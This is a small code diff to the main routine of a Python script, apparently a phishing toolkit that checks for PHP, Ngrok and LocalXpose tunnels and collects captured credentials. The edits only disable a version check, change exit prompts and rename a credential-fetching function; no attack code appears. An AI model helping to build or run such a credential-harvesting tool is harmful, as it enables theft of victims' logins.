@@ -22,7 +22,7 @@ checkPermissions()
 installGetText()
 languageSelector()
 checkConnection()
-verCheck()
+#verCheck()
 checkPHP()
 checkLocalxpose()
 checkNgrok()
@@ -33,6 +33,7 @@ ifSettingsNotExists()
 readConfig()
 
 if __name__ == "__main__":
+
     try:
 
         mainMenu()
@@ -45,13 +46,11 @@ if __name__ == "__main__":
 
         ##############
         selectServer(port)
-        input()
+        input("Hit enter to exit")
         exit()
 
     except KeyboardInterrupt:
 
         port = '8080' # When Keyword Interrupt Occurs before defining Port by User. Script will use 8080 port.(Just To Remove Exception Errors)
-        getCredentials1(port)
+        getCredentials(port)
         endMessage(port)
-        input()
-        exit()
